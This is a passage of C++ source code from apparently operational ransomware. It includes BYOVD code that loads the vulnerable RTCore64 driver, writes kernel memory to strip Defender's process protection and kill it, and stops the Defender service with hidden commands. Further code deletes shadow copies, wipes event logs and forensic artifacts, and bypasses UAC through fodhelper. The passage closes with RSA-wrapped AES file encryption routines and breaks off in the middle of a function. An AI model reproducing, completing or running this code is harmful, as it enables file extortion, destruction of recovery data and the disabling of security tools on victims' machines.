            utils::EnablePrivilege(L"SeLoadDriverPrivilege");
            const std::wstring driverName = utils::widen(X("RTCore64"));
            const std::wstring driverFile = driverName + utils::widen(X(".sys"));

            wchar_t tmpPath[MAX_PATH]{};
            if (GetTempPathW(MAX_PATH, tmpPath) == 0) return false;
            std::wstring sysPath = std::wstring(tmpPath) + driverFile;
            g_driverPath = sysPath;

            HANDLE hFile = CreateFileW(sysPath.c_str(), GENERIC_WRITE, 0, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE) return false;
            DWORD written = 0;
            BOOL ok = WriteFile(hFile, kRTCore64, kRTCore64_len, &written, NULL) &&
                written == kRTCore64_len;
            CloseHandle(hFile);
            if (!ok) return false;

            g_hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
            if (!g_hSCM) return false;

            std::wstring svcName = L"vxd" + utils::RandomHex(8);
            g_hSvc = CreateServiceW(g_hSCM, svcName.c_str(), svcName.c_str(),
                SERVICE_START | DELETE | SERVICE_STOP,
                SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                sysPath.c_str(), NULL, NULL, NULL, NULL, NULL);

            if (g_hSvc) {
                StartServiceW(g_hSvc, 0, NULL);
            }

            const std::wstring device = utils::widen(X("\\\\.\\")) + driverName;
            hRTCore = CreateFileW(device.c_str(), GENERIC_READ | GENERIC_WRITE,
                0, NULL, OPEN_EXISTING, 0, NULL);

            if (hRTCore == INVALID_HANDLE_VALUE) {
                if (g_hSvc) { DeleteService(g_hSvc); CloseServiceHandle(g_hSvc); g_hSvc = NULL; }
                if (g_hSCM) { CloseServiceHandle(g_hSCM); g_hSCM = NULL; }
                DeleteFileW(sysPath.c_str());
                return false;
            }
            return true;
        }

        static void UnloadDriver() {
            if (hRTCore != INVALID_HANDLE_VALUE) { CloseHandle(hRTCore); hRTCore = INVALID_HANDLE_VALUE; }
            if (g_hSvc) {
                SERVICE_STATUS ss{};
                ControlService(g_hSvc, SERVICE_CONTROL_STOP, &ss);
                DeleteService(g_hSvc);
                CloseServiceHandle(g_hSvc);
                g_hSvc = NULL;
            }
            if (g_hSCM) { CloseServiceHandle(g_hSCM); g_hSCM = NULL; }
            if (!g_driverPath.empty()) {
                // The service is stopping; give the driver a moment to unload,
                // then remove the dropped .sys so it is not left on disk.
                Sleep(250);
                if (!DeleteFileW(utils::extended(g_driverPath).c_str())) {
                    MoveFileExW(utils::extended(g_driverPath).c_str(), NULL,
                        MOVEFILE_DELAY_UNTIL_REBOOT);
                }
                g_driverPath.clear();
            }
        }

        static bool ReadKernelMemory(uint64_t address, uint8_t* buffer, size_t size) {
            if (hRTCore == INVALID_HANDLE_VALUE) return false;
            if (size == 0 || size > 0x1000) return false;

            RTCoreReadReq req{ address, (uint32_t)size, 0 };
            std::vector<uint8_t> out(sizeof(RTCoreReadReq) + size);
            memcpy(out.data(), &req, sizeof(req));

            DWORD br = 0;
            if (!DeviceIoControl(hRTCore, 0x80002048, out.data(), (DWORD)out.size(), out.data(), (DWORD)out.size(), &br, NULL)) return false;

            if (br >= sizeof(RTCoreReadReq) + size)
                memcpy(buffer, out.data() + sizeof(RTCoreReadReq), size);
            else if (br >= size)
                memcpy(buffer, out.data(), size);
            else return false;
            return true;
        }

        static bool WriteKernelMemory(uint64_t address, const uint8_t* buffer, size_t size) {
            if (hRTCore == INVALID_HANDLE_VALUE) return false;
            if (size == 0 || size > 0x1000) return false;

            std::vector<uint8_t> in(sizeof(RTCoreWriteReq) - 1 + size);
            RTCoreWriteReq* r = (RTCoreWriteReq*)in.data();
            r->Address = address;
            r->Size = (uint32_t)size;
            r->Padding = 0;
            memcpy(r->Data, buffer, size);

            DWORD br = 0;
            return DeviceIoControl(hRTCore, 0x8000204C, in.data(), (DWORD)in.size(), NULL, 0, &br, NULL) != FALSE;
        }

        static uint64_t GetKernelBase(const char* moduleName) {
            LPVOID drivers[1024];
            DWORD cbNeeded = 0;
            if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded <= sizeof(drivers)) {
                char szDriver[MAX_PATH];
                int cDrivers = cbNeeded / sizeof(drivers[0]);
                for (int i = 0; i < cDrivers; i++) {
                    if (GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) {
                        if (_stricmp(szDriver, moduleName) == 0) return (uint64_t)drivers[i];
                    }
                }
            }
            return 0;
        }

        static uint64_t ResolveSystemEprocess() {
            uint64_t ntBase = GetKernelBase("ntoskrnl.exe");
            if (!ntBase) ntBase = GetKernelBase("ntkrnlmp.exe");
            if (!ntBase) return 0;

            uint64_t peHeaderAddr = ntBase + 0x3C;
            uint32_t e_lfanew = 0;
            if (!ReadKernelMemory(peHeaderAddr, (uint8_t*)&e_lfanew, sizeof(e_lfanew))) return 0;

            uint64_t optHeaderAddr = ntBase + e_lfanew + 0x18;
            uint16_t magic = 0;
            if (!ReadKernelMemory(optHeaderAddr, (uint8_t*)&magic, sizeof(magic))) return 0;

            uint64_t exportDirAddr = optHeaderAddr + (magic == 0x20B ? 0x70 : 0x60);
            uint32_t exportRva = 0;
            if (!ReadKernelMemory(exportDirAddr, (uint8_t*)&exportRva, sizeof(exportRva))) return 0;
            if (!exportRva) return 0;

            uint64_t exportBase = ntBase + exportRva;
            uint32_t numNames = 0, addrNames = 0, addrFuncs = 0;
            if (!ReadKernelMemory(exportBase + 0x18, (uint8_t*)&numNames, sizeof(numNames))) return 0;
            if (!ReadKernelMemory(exportBase + 0x1C, (uint8_t*)&addrFuncs, sizeof(addrFuncs))) return 0;
            if (!ReadKernelMemory(exportBase + 0x20, (uint8_t*)&addrNames, sizeof(addrNames))) return 0;

            char sysName[] = "PsInitialSystemProcess";
            for (uint32_t i = 0; i < numNames; i++) {
                uint32_t nameRva = 0;
                if (!ReadKernelMemory(ntBase + addrNames + (i * 4), (uint8_t*)&nameRva, sizeof(nameRva))) return 0;

                char name[32] = { 0 };
                if (!ReadKernelMemory(ntBase + nameRva, (uint8_t*)name, sizeof(sysName))) return 0;

                if (strcmp(name, sysName) == 0) {
                    uint16_t ordinal = 0;
                    if (!ReadKernelMemory(ntBase + addrFuncs + (i * 2), (uint8_t*)&ordinal, sizeof(ordinal))) return 0;
                    uint32_t funcRva = 0;
                    if (!ReadKernelMemory(ntBase + addrFuncs + (ordinal * 4), (uint8_t*)&funcRva, sizeof(funcRva))) return 0;

                    uint64_t ptrAddr = ntBase + funcRva;
                    uint64_t sysEprocess = 0;
                    if (ReadKernelMemory(ptrAddr, (uint8_t*)&sysEprocess, sizeof(sysEprocess))) {
                        return sysEprocess;
                    }
                }
            }
            return 0;
        }

        static bool StripProcessProtection(DWORD targetPid) {
            if (hRTCore == INVALID_HANDLE_VALUE) return false;
            if (!SupportedEprocessLayout()) return false;
            if (!g_SystemEprocess) g_SystemEprocess = ResolveSystemEprocess();
            if (!g_SystemEprocess) return false;

            uint64_t eprocess = g_SystemEprocess;
            uint64_t listHead = eprocess + kActiveProcessLinksOffset;

            for (int i = 0; i < 4096; ++i) {
                uint64_t flink = 0;
                if (!ReadKernelMemory(eprocess + kActiveProcessLinksOffset, (uint8_t*)&flink, sizeof(flink))) return false;

                uint64_t next = flink - kActiveProcessLinksOffset;
                if (!next || next == listHead - kActiveProcessLinksOffset) return false;

                uint64_t pid = 0;
                if (!ReadKernelMemory(next + kUniqueProcessIdOffset, (uint8_t*)&pid, sizeof(pid))) return false;

                if ((DWORD)pid == targetPid) {
                    // Read before writing: an implausible value means the layout
                    // does not match and refusing is the only safe move.
                    uint16_t prot = 0;
                    if (!ReadKernelMemory(next + kProtectionOffset, (uint8_t*)&prot, sizeof(prot))) return false;
                    uint8_t lo = (uint8_t)(prot & 0xFF);
                    uint8_t hi = (uint8_t)(prot >> 8);
                    uint8_t type = lo & 0x07;
                    uint8_t signer = (lo >> 4) & 0x0F;
                    if (hi != 0 || type < 1 || type > 3 || signer < 1 || signer > 6) {
                        // PS_PROTECTION shape mismatch (or already unprotected).
                        return false;
                    }
                    uint8_t zero[2] = { 0, 0 };
                    return WriteKernelMemory(next + kProtectionOffset, zero, sizeof(zero));
                }
                eprocess = next;
            }
            return false;
        }

        static DWORD FindProcessId(const wchar_t* name) {
            DWORD pid = 0;
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32W pe{ sizeof(pe) };
                if (Process32FirstW(hSnap, &pe)) {
                    do {
                        if (_wcsicmp(pe.szExeFile, name) == 0) {
                            pid = pe.th32ProcessID;
                            break;
                        }
                    } while (Process32NextW(hSnap, &pe));
                }
                CloseHandle(hSnap);
            }
            return pid;
        }

        static void NeutralizeEDR() {
            std::string report = "byovd=disabled";
            if (config::kEnableBYOVD) {
                if (!SupportedEprocessLayout()) {
                    report = "byovd=unsupported-build";
                }
                else if (HvciEnabled()) {
                    report = "byovd=hvci";
                }
                else if (!DropAndLoadDriver()) {
                    // The vulnerable-driver blocklist or a missing privilege.
                    // Defender stays up; the operator needs to know.
                    report = "byovd=blocked";
                }
                else {
                    DWORD defenderPid = FindProcessId(L"MsMpEng.exe");
                    bool killed = false;
                    if (defenderPid && StripProcessProtection(defenderPid)) {
                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, defenderPid);
                        if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); killed = true; }
                    }
                    report = std::string("byovd=loaded defender=") +
                        (killed ? "killed" : (defenderPid ? "alive" : "absent"));
                }
                report += DriverBlocklistEnabled() ? " blocklist=on" : " blocklist=off";
            }

            auto run_hidden = [](const std::string& obf, DWORD waitMs) {
                utils::RunHidden(utils::widen(obf), waitMs);
                };
            run_hidden(X("sc stop WinDefend"), 5000);
            run_hidden(X("taskkill /F /IM MsMpEng.exe"), 5000);

            // Post-check so the panel sees whether the fallback actually worked.
            if (FindProcessId(L"MsMpEng.exe")) report += " fallback=defender-alive";
            else report += " fallback=clean";

            // Driver out immediately: it must not stay loaded during encryption.
            UnloadDriver();
            g_lastReport = report;
        }

        // Shadow copies via the VSS COM API: no vssadmin child process.
        static void DeleteShadowCopies() {
            HRESULT hrCo = CoInitializeEx(NULL, COINIT_MULTITHREADED);
            IVssBackupComponents* pBackup = nullptr;
            if (SUCCEEDED(CreateVssBackupComponents(&pBackup)) && pBackup) {
                if (SUCCEEDED(pBackup->InitializeForBackup()) &&
                    SUCCEEDED(pBackup->SetContext(VSS_CTX_ALL))) {
                    LONG deleted = 0;
                    VSS_ID nondeleted{};
                    VSS_ID allSnapshots{};
                    pBackup->DeleteSnapshots(allSnapshots, VSS_OBJECT_SNAPSHOT,
                        TRUE, &deleted, &nondeleted);
                }
                pBackup->Release();
            }
            if (SUCCEEDED(hrCo)) CoUninitialize();
        }

        // Event logs wiped through the EventLog API: no wevtutil child process.
        static void ClearEventLogs() {
            const wchar_t* logs[] = { L"System", L"Application", L"Security" };
            for (const wchar_t* name : logs) {
                HANDLE h = OpenEventLogW(NULL, name);
                if (h) {
                    ClearEventLogW(h, NULL);
                    CloseEventLog(h);
                }
            }
        }

        static void DeleteTreeContents(const std::wstring& dir, const wchar_t* pattern) {
            WIN32_FIND_DATAW fd{};
            HANDLE h = FindFirstFileW((dir + L"\\" + pattern).c_str(), &fd);
            if (h == INVALID_HANDLE_VALUE) return;
            do {
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                std::wstring p = dir + L"\\" + fd.cFileName;
                SetFileAttributesW(p.c_str(), FILE_ATTRIBUTE_NORMAL);
                DeleteFileW(p.c_str());
            } while (FindNextFileW(h, &fd));
            FindClose(h);
        }

        static void DeleteUsnJournal(wchar_t drive) {
            wchar_t vol[8] = { L'\\', L'\\', L'.', L'\\', drive, L':', 0 };
            HANDLE h = CreateFileW(vol, GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
            if (h == INVALID_HANDLE_VALUE) return;
            DELETE_USN_JOURNAL_DATA d{};
            d.UsnJournalID = 0;
            d.DeleteFlags = USN_DELETE_FLAG_DELETE;
            DWORD br = 0;
            DeviceIoControl(h, FSCTL_DELETE_USN_JOURNAL, &d, sizeof(d), NULL, 0, &br, NULL);
            CloseHandle(h);
        }

        // Best-effort anti-forensics: USN journals, prefetch, shimcache, BAM,
        // PowerShell history and RDP caches. Locked system hives (SRUM,
        // Amcache) are attempted where possible and skipped when held open.
        static void PurgeForensics() {
            for (wchar_t c = L'C'; c <= L'Z'; c++) {
                wchar_t root[4] = { c, L':', L'\\', 0 };
                if (GetDriveTypeW(root) == DRIVE_FIXED) DeleteUsnJournal(c);
            }

            wchar_t win[MAX_PATH]{};
            if (GetWindowsDirectoryW(win, MAX_PATH)) {
                std::wstring w = win;
                DeleteTreeContents(w + L"\\Prefetch", L"*.pf");
                DeleteTreeContents(w + L"\\System32\\sru", L"*.dat");
                DeleteTreeContents(w + L"\\System32\\LogFiles\\SRU", L"*");
            }

            HKEY h = NULL;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache",
                0, KEY_SET_VALUE, &h) == ERROR_SUCCESS) {
                RegDeleteValueW(h, L"AppCompatCache");
                RegCloseKey(h);
            }
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                L"SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings",
                0, KEY_ALL_ACCESS, &h) == ERROR_SUCCESS) {
                wchar_t sub[256]{};
                DWORD idx = 0;
                while (RegEnumKeyW(h, idx++, sub, 256) == ERROR_SUCCESS) {
                    RegDeleteTreeW(h, sub);
                }
                RegCloseKey(h);
            }

            // Per-profile artifacts: PSReadLine history and RDP bitmap caches.
            wchar_t profiles[MAX_PATH]{};
            if (GetEnvironmentVariableW(L"SystemDrive", profiles, MAX_PATH) > 0) {
                std::wstring users = std::wstring(profiles) + L"\\Users";
                WIN32_FIND_DATAW fd{};
                HANDLE uh = FindFirstFileW((users + L"\\*").c_str(), &fd);
                if (uh != INVALID_HANDLE_VALUE) {
                    do {
                        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
                        std::wstring up = users + L"\\" + fd.cFileName;
                        DeleteTreeContents(up + L"\\AppData\\Roaming\\Microsoft\\Windows"
                                              L"\\PowerShell\\PSReadLine", L"*.txt");
                        DeleteTreeContents(up + L"\\AppData\\Local\\Microsoft"
                                              L"\\Terminal Server Client\\Cache", L"*");
                    } while (FindNextFileW(uh, &fd));
                    FindClose(uh);
                }
            }
        }

        static void DestroyRecovery() {
            DeleteShadowCopies();
            ClearEventLogs();
            PurgeForensics();
        }

        // Silent elevation before the runas prompt. fodhelper/computerdefaults
        // auto-elevate and execute the HKCU ms-settings command. The elevated
        // child signals a random per-attempt event.
        static bool TryUACBypass(const std::wstring& selfPath,
                const std::wstring& extraArgs = L"") {
            const wchar_t* keyPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
            const wchar_t* triggers[] = { L"fodhelper.exe", L"computerdefaults.exe" };
            for (const wchar_t* trigger : triggers) {
                HKEY h = NULL;
                bool keyExisted = RegOpenKeyExW(HKEY_CURRENT_USER, keyPath, 0,
                    KEY_READ | KEY_WRITE, &h) == ERROR_SUCCESS;
                std::vector<uint8_t> oldDefault, oldDelegate;
                DWORD oldDefaultType = 0, oldDelegateType = 0;
                bool hadDefault = false, hadDelegate = false;
                if (keyExisted) {
                    DWORD sz = 0;
                    if (RegQueryValueExW(h, NULL, NULL, &oldDefaultType, NULL, &sz)
                            == ERROR_SUCCESS && sz) {
                        oldDefault.resize(sz);
                        hadDefault = RegQueryValueExW(h, NULL, NULL, &oldDefaultType,
                            oldDefault.data(), &sz) == ERROR_SUCCESS;
                    }
                    sz = 0;
                    if (RegQueryValueExW(h, L"DelegateExecute", NULL, &oldDelegateType,
                            NULL, &sz) == ERROR_SUCCESS && sz) {
                        oldDelegate.resize(sz);
                        hadDelegate = RegQueryValueExW(h, L"DelegateExecute", NULL,
                            &oldDelegateType, oldDelegate.data(), &sz) == ERROR_SUCCESS;
                    }
                }
                if (!keyExisted &&
                    RegCreateKeyExW(HKEY_CURRENT_USER, keyPath, 0, NULL, 0,
                        KEY_WRITE, NULL, &h, NULL) != ERROR_SUCCESS) {
                    continue;
                }
                if (!h) continue;
                std::wstring evt = L"Local\\vxu" + utils::RandomHex(8);
                std::wstring cmd = L"\"" + selfPath + L"\" --uac-child --uac-event \"" +
                    evt + L"\"";
                if (!extraArgs.empty()) cmd += L" " + extraArgs;
                RegSetValueExW(h, NULL, 0, REG_SZ, (const BYTE*)cmd.c_str(),
                    (DWORD)((cmd.size() + 1) * sizeof(wchar_t)));
                RegSetValueExW(h, L"DelegateExecute", 0, REG_SZ,
                    (const BYTE*)L"", sizeof(wchar_t));
                RegCloseKey(h);

                HANDLE ev = CreateEventW(NULL, TRUE, FALSE, evt.c_str());
                if (!ev) {
                    // Restore below.
                }
                SHELLEXECUTEINFOW sei{ sizeof(sei) };
                sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
                sei.lpVerb = L"open";
                sei.lpFile = trigger;
                sei.nShow = SW_HIDE;
                bool ok = false;
                if (ev && ShellExecuteExW(&sei)) {
                    DWORD w = WaitForSingleObject(ev, 10000);
                    ok = (w == WAIT_OBJECT_0);
                    if (sei.hProcess) CloseHandle(sei.hProcess);
                }
                if (ev) CloseHandle(ev);

                // Restore the user's real settings key instead of deleting it.
                HKEY rh = NULL;
                if (RegOpenKeyExW(HKEY_CURRENT_USER, keyPath, 0,
                    KEY_SET_VALUE, &rh) == ERROR_SUCCESS) {
                    if (hadDefault)
                        RegSetValueExW(rh, NULL, 0, oldDefaultType,
                            oldDefault.data(), (DWORD)oldDefault.size());
                    else
                        RegDeleteValueW(rh, NULL);
                    if (hadDelegate)
                        RegSetValueExW(rh, L"DelegateExecute", 0, oldDelegateType,
                            oldDelegate.data(), (DWORD)oldDelegate.size());
                    else
                        RegDeleteValueW(rh, L"DelegateExecute");
                    RegCloseKey(rh);
                }
                if (!keyExisted)
                    RegDeleteKeyW(HKEY_CURRENT_USER, keyPath);
                if (ok) return true;
            }
            return false;
        }
    } // namespace evasion
} // namespace vex

// ============================================================================
// 4. CRYPTO MODULE
// ============================================================================
namespace vex {
    namespace crypto {
        struct Api {
            decltype(&BCryptOpenAlgorithmProvider) OpenProvider = nullptr;
            decltype(&BCryptGenRandom) GenRandom = nullptr;
            decltype(&BCryptImportKeyPair) ImportKeyPair = nullptr;
            decltype(&BCryptEncrypt) Encrypt = nullptr;
            decltype(&BCryptDestroyKey) DestroyKey = nullptr;
            decltype(&BCryptCloseAlgorithmProvider) CloseProvider = nullptr;
            decltype(&BCryptGenerateSymmetricKey) GenSymmetricKey = nullptr;
            decltype(&BCryptSetProperty) SetProperty = nullptr;
            decltype(&BCryptCreateHash) CreateHash = nullptr;
            decltype(&BCryptHashData) HashData = nullptr;
            decltype(&BCryptFinishHash) FinishHash = nullptr;
            decltype(&BCryptDestroyHash) DestroyHash = nullptr;
        } api{};

        static bool Init() {
            HMODULE hBcr = LoadLibraryA(X("bcrypt.dll").c_str());
            if (!hBcr) return false;
            api.OpenProvider = (decltype(&BCryptOpenAlgorithmProvider))GetProcAddress(hBcr, X("BCryptOpenAlgorithmProvider").c_str());
            api.GenRandom = (decltype(&BCryptGenRandom))GetProcAddress(hBcr, X("BCryptGenRandom").c_str());
            api.ImportKeyPair = (decltype(&BCryptImportKeyPair))GetProcAddress(hBcr, X("BCryptImportKeyPair").c_str());
            api.Encrypt = (decltype(&BCryptEncrypt))GetProcAddress(hBcr, X("BCryptEncrypt").c_str());
            api.DestroyKey = (decltype(&BCryptDestroyKey))GetProcAddress(hBcr, X("BCryptDestroyKey").c_str());
            api.CloseProvider = (decltype(&BCryptCloseAlgorithmProvider))GetProcAddress(hBcr, X("BCryptCloseAlgorithmProvider").c_str());
            api.GenSymmetricKey = (decltype(&BCryptGenerateSymmetricKey))GetProcAddress(hBcr, X("BCryptGenerateSymmetricKey").c_str());
            api.SetProperty = (decltype(&BCryptSetProperty))GetProcAddress(hBcr, X("BCryptSetProperty").c_str());
            api.CreateHash = (decltype(&BCryptCreateHash))GetProcAddress(hBcr, X("BCryptCreateHash").c_str());
            api.HashData = (decltype(&BCryptHashData))GetProcAddress(hBcr, X("BCryptHashData").c_str());
            api.FinishHash = (decltype(&BCryptFinishHash))GetProcAddress(hBcr, X("BCryptFinishHash").c_str());
            api.DestroyHash = (decltype(&BCryptDestroyHash))GetProcAddress(hBcr, X("BCryptDestroyHash").c_str());
            return api.OpenProvider && api.GenRandom && api.Encrypt &&
                api.GenSymmetricKey && api.SetProperty &&
                api.CreateHash && api.HashData && api.FinishHash && api.DestroyHash;
        }

        // HMAC-SHA256 over a byte range, returned as lowercase hex.
        static std::string HmacSha256Hex(const uint8_t* key, size_t keyLen,
            const std::string& data) {
            if (!api.CreateHash) return "";
            BCRYPT_ALG_HANDLE hAlg = NULL;
            NTSTATUS stOpen = api.OpenProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL,
                BCRYPT_ALG_HANDLE_HMAC_FLAG);
            if (stOpen != 0) return "";

            ULONG objLen = 0, cb = 0;
            if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&objLen,
                sizeof(objLen), &cb, 0) != 0 || objLen == 0) {
                api.CloseProvider(hAlg, 0);
                return "";
            }
            std::vector<uint8_t> obj(objLen);
            BCRYPT_HASH_HANDLE h = NULL;
            bool ok = api.CreateHash(hAlg, &h, obj.data(), objLen,
                (PUCHAR)key, (ULONG)keyLen, 0) == 0;
            if (ok) ok = api.HashData(h, (PUCHAR)data.data(), (ULONG)data.size(), 0) == 0;
            uint8_t digest[32]{};
            if (ok) ok = api.FinishHash(h, digest, sizeof(digest), 0) == 0;
            if (h) api.DestroyHash(h);
            api.CloseProvider(hAlg, 0);
            if (!ok) return "";

            static const char* hex = "0123456789abcdef";
            std::string out;
            out.reserve(64);
            for (uint8_t b : digest) {
                out.push_back(hex[b >> 4]);
                out.push_back(hex[b & 0xF]);
            }
            return out;
        }

        static uint32_t Crc32(const uint8_t* p, size_t n) {
            uint32_t c = 0xFFFFFFFFu;
            for (size_t i = 0; i < n; i++) {
                c ^= p[i];
                for (int k = 0; k < 8; k++)
                    c = (c >> 1) ^ (0xEDB88320u & (uint32_t)(-(int32_t)(c & 1)));
            }
            return ~c;
        }

        struct Sha256Ctx {
            BCRYPT_ALG_HANDLE alg = NULL;
            BCRYPT_HASH_HANDLE h = NULL;
            std::vector<uint8_t> obj;
            bool ok = false;

            bool Init() {
                if (api.OpenProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0)
                    return false;
                ULONG len = 0, cb = 0;
                if (BCryptGetProperty(alg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&len,
                    sizeof(len), &cb, 0) != 0) return false;
                obj.resize(len);
                ok = api.CreateHash(alg, &h, obj.data(), len, NULL, 0, 0) == 0;
                return ok;
            }
            void Update(const uint8_t* p, size_t n) {
                if (ok && n) api.HashData(h, (PUCHAR)p, (ULONG)n, 0);
            }
            void Final(uint8_t out[32]) {
                if (ok) api.FinishHash(h, out, 32, 0);
            }
            ~Sha256Ctx() {
                if (h) api.DestroyHash(h);
                if (alg) api.CloseProvider(alg, 0);
            }
        };

        static bool WrapKey(const uint8_t* aeskey, uint8_t* out, uint16_t* outlen) {
            BCRYPT_ALG_HANDLE hAlg = NULL;
            if (api.OpenProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0) != 0) return false;

            BCRYPT_RSAKEY_BLOB hdr{};
            hdr.Magic = BCRYPT_RSAPUBLIC_MAGIC;
            hdr.BitLength = 2048;
            hdr.cbPublicExp = 3;
            hdr.cbModulus = 256;

            std::vector<uint8_t> blob(sizeof(BCRYPT_RSAKEY_BLOB) + 3 + 256);
            memcpy(blob.data(), &hdr, sizeof(hdr));
            uint8_t exp[] = { 0x01, 0x00, 0x01 };
            memcpy(blob.data() + sizeof(hdr), exp, 3);
            // BCrypt wants the modulus big-endian; the embedded table is stored
            // little-endian. Reverse it or the panel can never unwrap the key.
            uint8_t* mod = blob.data() + sizeof(hdr) + 3;
            for (int i = 0; i < 256; i++) mod[i] = config::kRsaPubMod[255 - i];

            BCRYPT_KEY_HANDLE hKey = NULL;
            if (api.ImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB, &hKey, blob.data(), (ULONG)blob.size(), 0) != 0) {
                api.CloseProvider(hAlg, 0);
                return false;
            }

            ULONG outSz = 0;
            BCRYPT_OAEP_PADDING_INFO oaep{ BCRYPT_SHA256_ALGORITHM, NULL, 0 };
            NTSTATUS st = api.Encrypt(hKey, (PUCHAR)aeskey, config::kAesKeyBytes,
                &oaep, NULL, 0, NULL, 0, &outSz, BCRYPT_PAD_OAEP);
            if (st != 0) { api.DestroyKey(hKey); api.CloseProvider(hAlg, 0); return false; }

            st = api.Encrypt(hKey, (PUCHAR)aeskey, config::kAesKeyBytes,
                &oaep, NULL, 0, out, outSz, &outSz, BCRYPT_PAD_OAEP);

            api.DestroyKey(hKey);
            api.CloseProvider(hAlg, 0);
            if (st == 0) { *outlen = (uint16_t)outSz; return true; }
            return false;
        }

        static bool GenNonce(uint8_t out[12]) {
            SecureZeroMemory(out, 12);
            return api.GenRandom != nullptr &&
                api.GenRandom(NULL, out, 12, BCRYPT_USE_SYSTEM_PREFERRED_RNG) == 0;
        }

        static bool GenAesKey(uint8_t out[32]) {
            SecureZeroMemory(out, 32);
            return api.GenRandom != nullptr &&
                api.GenRandom(NULL, out, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG) == 0;
        }

        // Per-worker scratch. Kept off thread_local on purpose: the payload is
        // delivered by a reflective loader, and static TLS is not provisioned
        // for manually mapped images.
        struct Scratch {
            uint8_t buf[64 * 1024];
            uint8_t ct[64 * 1024 + 16];
            ~Scratch() {
                SecureZeroMemory(buf, sizeof(buf));
                SecureZeroMemory(ct, sizeof(ct));
            }
        };

        enum class Result { Ok, Skip, Fail };

        // Container v2, same-name replacement:
        //   "VEX2" | u32 flags | u64 original | u32 stride | u32 chunk | u64 chunks
        //   per chunk: u8 mode | u32 len | raw bytes OR nonce(12) | ct(len) | tag(16)
        // The file keeps its original name and extension; the plaintext is
        // replaced by the container via MoveFileExW after the journal line is
        // flushed. A file that already starts with VEX2 is skipped, so re-runs
        // never double-encrypt.
        // Force the journal record to disk; ofstream::flush only reaches the
    // Windows cache. Cheap enough at one record per file.
    static void FlushJournal(const std::wstring& path) {
        HANDLE h = CreateFileW(utils::extended(path).c_str(), GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h == INVALID_HANDLE_VALUE) return;
        FlushFileBuffers(h);
        CloseHandle(h);
    }

    // Authenticate the complete journal with the victim AES key. The sidecar
    // is HMAC-SHA256 hex; a crash before sealing leaves no sidecar (the
    // decrypter still accepts the journal for recovery, but a sealed journal
    // cannot be modified without the key).
    static bool SealJournal(const std::wstring& path, const uint8_t* key) {
        std::ifstream in(utils::extended(path).c_str(), std::ios::binary);
        if (!in) return false;
        std::string data((std::istreambuf_iterator<char>(in)),
                         std::istreambuf_iterator<char>());
        in.close();
        std::string mac = HmacSha256Hex(key, 32, data);
        if (mac.empty()) return false;
        std::ofstream out(utils::extended(path + L".sig").c_str(),
                          std::ios::binary | std::ios::trunc);
        if (!out) return false;
        out << mac << "\n";
        out.flush();
        return out.good();
    }

        // Preserve the source DACL/owner where possible; the temp container
        // inherits the directory ACL otherwise.
        static void CopySecurity(const std::wstring& src, const std::wstring& dst) {
            DWORD need = 0;
            GetFileSecurityW(src.c_str(),
                OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION |
                DACL_SECURITY_INFORMATION, NULL, 0, &need);
            if (!need) return;
            std::vector<uint8_t> sd(need);
            if (!GetFileSecurityW(src.c_str(),
                OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION |
                DACL_SECURITY_INFORMATION, (PSECURITY_DESCRIPTOR)sd.data(), need, &need))
                return;
            SetFileSecurityW(dst.c_str(),
                OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION |
                DACL_SECURITY_INFORMATION, (PSECURITY_DESCRIPTOR)sd.data());
        }

        static bool HasAlternateStreams(const std::wstring& path) {
            WIN32_FIND_STREAM_DATA sd{};
            HANDLE h = FindFirstStreamW(utils::extended(path).c_str(),
                FindStreamInfoStandard, &sd, 0);
            if (h == INVALID_HANDLE_VALUE) return false;
            bool found = false;
            do {
                if (wcscmp(sd.cStreamName, L"::$DATA") != 0) { found = true; break; }
            } while (FindNextStreamW(h, &sd));
            FindClose(h);
            return found;
        }

    static Result EncryptFile(const std::wstring& canonicalPath, const uint8_t* key,
            std::ofstream& journal, const std::wstring& journalPath,
            std::mutex& jmtx, Scratch& s, uint64_t* bytesOut) {
            if (bytesOut) *bytesOut = 0;
            if (!journal.is_open()) return Result::Fail;
            (void)journalPath; // kept for call-site symmetry

            BCRYPT_ALG_HANDLE hAlg = NULL;
            if (api.OpenProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
                return Result::Fail;
